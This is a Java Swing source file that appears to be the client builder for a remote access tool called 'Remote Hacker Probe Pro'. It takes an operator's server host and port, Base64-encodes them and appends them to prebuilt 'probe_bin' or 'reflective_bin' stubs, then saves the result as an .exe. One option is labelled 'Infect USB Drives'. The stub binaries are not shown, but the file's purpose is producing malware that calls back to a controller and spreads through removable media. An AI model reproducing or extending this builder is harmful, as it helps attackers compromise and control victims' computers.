package rhp;

import java.awt.BorderLayout;
import java.awt.FlowLayout;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.filechooser.FileNameExtensionFilter;

import org.apache.commons.codec.binary.Base64;

import javax.swing.JLabel;
import javax.swing.JOptionPane;

import java.awt.Font;
import javax.swing.JTextField;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.awt.event.ActionEvent;
import javax.swing.JCheckBox;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.JTabbedPane;

public class Builder extends JDialog {

	private final JPanel contentPanel = new JPanel();
	private JTextField portvalue;
	static JCheckBox usb;
	private JTextField reflectiveHost;
	private JTextField reflectivePort;
	
	/**
	 * Launch the application.
	 */
	
	private static void copyFile(File source, File dest) throws IOException {
	    InputStream is = null;
	    OutputStream os = null;
	    try {
	        is = new FileInputStream(source);
	        os = new FileOutputStream(dest);
	        byte[] buffer = new byte[1024];
	        int length;
	        while ((length = is.read(buffer)) > 0) {
	            os.write(buffer, 0, length);
	        }
	    } finally {
	        is.close();
	        os.close();
	    }
	}
	
	public static void build(Boolean isLoader, String FilePath, String Host, String Port)
	{
		File stub;
		if(isLoader)
		{
			stub = new File("reflective_bin");
		} else {
			stub = new File("probe_bin");
		}
		String usbthread = "";
		
		if(usb.isSelected())
		{
			usbthread = "1";
		} else {
			usbthread = "0";
		}
		
		String fullvalue = Host + ":" + Port + ":" + usbthread;
		
		File destination = new File(FilePath);
		if(stub.exists()) {
			try {
				copyFile(stub, destination);
				FileWriter wt = new FileWriter(destination, true);
				wt.write("\n\n"); wt.write(fullvalue);
				wt.close();
				JOptionPane.showMessageDialog(null, "Built Client : " + destination);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} else {
			JOptionPane.showMessageDialog(null, "ERROR : Cannot create stub because file 'probe_bin' or 'reflective_bin' is missing! Which is required!");
		}
	}
	
	/**
	 * Create the dialog.
	 */
	public Builder() {
		setResizable(false);
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setTitle("Remote Hacker Probe Pro | Client Builder");
		setBounds(100, 100, 405, 252);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		contentPanel.setLayout(null);
		
		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		tabbedPane.setBounds(0, 0, 499, 289);
		contentPanel.add(tabbedPane);
		
		JPanel panel = new JPanel();
		tabbedPane.addTab("Probe Client", null, panel, null);
		
		JPanel panel_1 = new JPanel();
		tabbedPane.addTab("DLL Loader", null, panel_1, null);
		panel_1.setLayout(null);
		
		JLabel host_1 = new JLabel("Server Host : ");
		host_1.setFont(new Font("Calibri", Font.PLAIN, 12));
		host_1.setBounds(10, 52, 74, 31);
		panel_1.add(host_1);
		
		reflectiveHost = new JTextField();
		reflectiveHost.setFont(new Font("Consolas", Font.PLAIN, 12));
		reflectiveHost.setColumns(10);
		reflectiveHost.setBounds(81, 47, 301, 42);
		panel_1.add(reflectiveHost);
		
		JLabel lblNewLabel_2 = new JLabel("Server Port : ");
		lblNewLabel_2.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblNewLabel_2.setBounds(10, 114, 74, 14);
		panel_1.add(lblNewLabel_2);
		
		reflectivePort = new JTextField();
		reflectivePort.setFont(new Font("Consolas", Font.PLAIN, 12));
		reflectivePort.setColumns(10);
		reflectivePort.setBounds(81, 100, 301, 41);
		panel_1.add(reflectivePort);
		
		JButton btnNewButton_1 = new JButton("Build");
		btnNewButton_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String hs = reflectiveHost.getText();
				String ps = reflectivePort.getText();
				if(hs.length() > 0 && ps.length() > 0)
				{
					byte[] encodedHost = Base64.encodeBase64(hs.getBytes());
					String b64host = new String(encodedHost);
					
					byte[] encodedPort = Base64.encodeBase64(ps.getBytes());
					String b64port = new String(encodedPort);
					
					
					
					File fileToSave = null;
					JFileChooser fileChooser = new JFileChooser();
					FileNameExtensionFilter filter = new FileNameExtensionFilter("EXE File","exe");
					fileChooser.setFileFilter(filter);
					fileChooser.setDialogTitle("Where should this file be saved?");   
					int userSelection = fileChooser.showSaveDialog(null);
					 
					if (userSelection == JFileChooser.APPROVE_OPTION) {
					    fileToSave = fileChooser.getSelectedFile();
					    build(true, fileToSave.getAbsolutePath() + ".exe", b64host, b64port);
					    
					}
					
				} else {
					JOptionPane.showMessageDialog(null, "One or more values have been left empty.");
				}
			}
		});
		btnNewButton_1.setFont(new Font("Calibri", Font.BOLD, 12));
		btnNewButton_1.setBounds(220, 164, 162, 23);
		panel_1.add(btnNewButton_1);
		
		JLabel lblNewLabel_1_1 = new JLabel("Only run where you have permission to do so!");
		lblNewLabel_1_1.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblNewLabel_1_1.setBounds(10, 11, 277, 14);
		panel_1.add(lblNewLabel_1_1);
		
		JLabel host = new JLabel("Server Host : ");
		host.setBounds(5, 36, 74, 31);
		host.setFont(new Font("Calibri", Font.PLAIN, 12));
		
		JLabel lblNewLabel = new JLabel("Server Port : ");
		lblNewLabel.setBounds(5, 100, 74, 14);
		lblNewLabel.setFont(new Font("Calibri", Font.PLAIN, 12));
		
		JTextField hostvalue = new JTextField();
		hostvalue.setBounds(83, 31, 301, 41);
		hostvalue.setFont(new Font("Consolas", Font.PLAIN, 12));
		hostvalue.setColumns(10);
		
		portvalue = new JTextField();
		portvalue.setBounds(83, 83, 301, 41);
		portvalue.setFont(new Font("Consolas", Font.PLAIN, 12));
		portvalue.setColumns(10);
		
		JButton btnNewButton = new JButton("Build");
		btnNewButton.setBounds(222, 163, 162, 23);
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String hs = hostvalue.getText();
				String ps = portvalue.getText();
				if(hs.length() > 0 && ps.length() > 0)
				{
					byte[] encodedHost = Base64.encodeBase64(hs.getBytes());
					String b64host = new String(encodedHost);
					
					byte[] encodedPort = Base64.encodeBase64(ps.getBytes());
					String b64port = new String(encodedPort);
					
					
					
					File fileToSave = null;
					JFileChooser fileChooser = new JFileChooser();
					FileNameExtensionFilter filter = new FileNameExtensionFilter("EXE File","exe");
					fileChooser.setFileFilter(filter);
					fileChooser.setDialogTitle("Where should this file be saved?");   
					int userSelection = fileChooser.showSaveDialog(null);
					 
					if (userSelection == JFileChooser.APPROVE_OPTION) {
					    fileToSave = fileChooser.getSelectedFile();
					    build(false, fileToSave.getAbsolutePath() + ".exe", b64host, b64port);
					    
					}
					
				} else {
					JOptionPane.showMessageDialog(null, "One or more values have been left empty.");
				}
			}
		});
		btnNewButton.setFont(new Font("Calibri", Font.BOLD, 12));
		
		JLabel lblNewLabel_1 = new JLabel("Only run where you have permission to do so!");
		lblNewLabel_1.setBounds(5, 6, 277, 14);
		lblNewLabel_1.setFont(new Font("Calibri", Font.PLAIN, 12));
		
		usb = new JCheckBox("Infect USB Drives");
		usb.setBounds(6, 163, 198, 23);
		
		usb.setFont(new Font("Calibri", Font.PLAIN, 12));
		panel.setLayout(null);
		panel.add(lblNewLabel_1);
		panel.add(usb);
		panel.add(btnNewButton);
		panel.add(host);
		panel.add(lblNewLabel);
		panel.add(portvalue);
		panel.add(hostvalue);
		
	}
}
